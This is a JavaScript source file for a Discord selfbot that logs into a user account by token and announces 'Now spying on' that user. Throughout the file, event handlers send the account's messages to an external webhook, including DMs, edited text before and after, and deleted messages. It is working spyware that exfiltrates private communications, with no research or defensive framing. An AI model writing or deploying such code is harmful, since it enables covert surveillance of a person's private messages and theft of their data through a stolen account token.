const { Client } = require("discord.js-selfbot-v13");
require("dotenv").config();

const token = process.env.TOKEN;
const webhook = process.env.WEBHOOK;

const client = new Client();

client.once("ready", async () => {
  const message = `Now spying on ${client.user.tag}`;
  console.log(message); // or use your custom log function

  // Send embed to webhook when bot is ready
  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: client.user.username,
        avatar_url: client.user.displayAvatarURL(),
        embeds: [
          {
            title: "Setup Successful",
            description: `Now spying on ${client.user.tag}`,
            color: 3066993, // Green color (hex code for green #2ECC71 in decimal)
            fields: [],
          },
        ],
      }),
    });

    if (!response.ok) {
      throw new Error(`Webhook request failed with status: ${response.status}`);
    }
  } catch (error) {
    console.log("[ ERROR ] Failed to send webhook:", error.message);
  }
});

client.on("messageCreate", async (message) => {
  // Ignore messages from other people
  if (message.author.id !== client.user.id) return;

  // Determine message link or DM
  let msgLink = "";
  if (message.channel.type === "DM" || message.channel.type === "GROUP_DM") {
    msgLink = `In: DMs > <#${message.channel.id}>`;
  } else {
    msgLink = `https://discord.com/channels/${message.guild.id}/${message.channel.id}/${message.id}`;
  }

  // Send embed to webhook when a new message is created
  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: client.user.username,
        avatar_url: client.user.displayAvatarURL(),
        embeds: [
          {
            title: "New Message",
            description: "A new message has been sent",
            color: 3447003, // Blue color (hex code for blue #3498DB in decimal)
            fields: [
              {
                name: "Message",
                value: message.content || "No content",
                inline: false,
              },
              {
                name: "Channel",
                value:
                  message.channel.type === "DM" ||
                  message.channel.type === "GROUP_DM"
                    ? `DM Channel`
                    : `${message.guild.name} > <#${message.channel.id}> [Link to message](${msgLink})`,
                inline: false,
              },
            ],
          },
        ],
      }),
    });

    if (!response.ok) {
      throw new Error(`Webhook request failed with status: ${response.status}`);
    }
  } catch (error) {
    console.log("[ ERROR ] Failed to send webhook:", error.message);
  }
});

client.on("messageUpdate", async (oldMessage, newMessage) => {
  // Ensure oldMessage and newMessage are valid
  if (!oldMessage.author || !newMessage.author) return;

  // Ignore updates from other people
  if (oldMessage.author.id !== client.user.id) return;

  // Send embed to webhook for edited messages
  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: client.user.username,
        avatar_url: client.user.displayAvatarURL(),
        embeds: [
          {
            title: "Message Edited",
            description: "A message was edited",
            color: 15844367, // Yellow color (hex code for yellow #F1C40F in decimal)
            fields: [
              {
                name: "Before Message",
                value: oldMessage.content || "No content",
                inline: false,
              },
              {
                name: "New Message",
                value: newMessage.content || "No content",
                inline: false,
              },
              {
                name: "Channel",
                value:
                  newMessage.channel.type === "DM" ||
                  newMessage.channel.type === "GROUP_DM"
                    ? `DM Channel`
                    : `${newMessage.guild.name} > <#${newMessage.channel.id}>`,
                inline: false,
              },
            ],
          },
        ],
      }),
    });

    if (!response.ok) {
      throw new Error(`Webhook request failed with status: ${response.status}`);
    }
  } catch (error) {
    console.log("[ ERROR ] Failed to send webhook:", error.message);
  }
});

client.on("messageDelete", async (message) => {
  // Ensure message is valid
  if (!message.author) return;

  // Ignore deletions from other people
  if (message.author.id !== client.user.id) return;

  // Determine channel link
  let channelLink = "";
  if (message.channel.type === "DM" || message.channel.type === "GROUP_DM") {
    channelLink = `DM Channel`;
  } else {
    channelLink = `https://discord.com/channels/${message.guild.id}/${message.channel.id}`;
  }

  // Send embed to webhook for deleted messages
  try {
    const response = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: client.user.username,
        avatar_url: client.user.displayAvatarURL(),
        embeds: [
          {
            title: "Message Deleted",
            description: "A message was deleted",
            color: 15158332, // Red color (hex code for red #E74C3C in decimal)
            fields: [
              {
                name: "Deleted Message",
                value: message.content || "No content",
                inline: false,
              },
              {
                name: "Channel",
                value: channelLink,
                inline: false,
              },
            ],
          },
        ],
      }),
    });

    if (!response.ok) {
      throw new Error(`Webhook request failed with status: ${response.status}`);
    }
  } catch (error) {
    console.log("[ ERROR ] Failed to send webhook:", error.message);
  }
});

client.login(token);
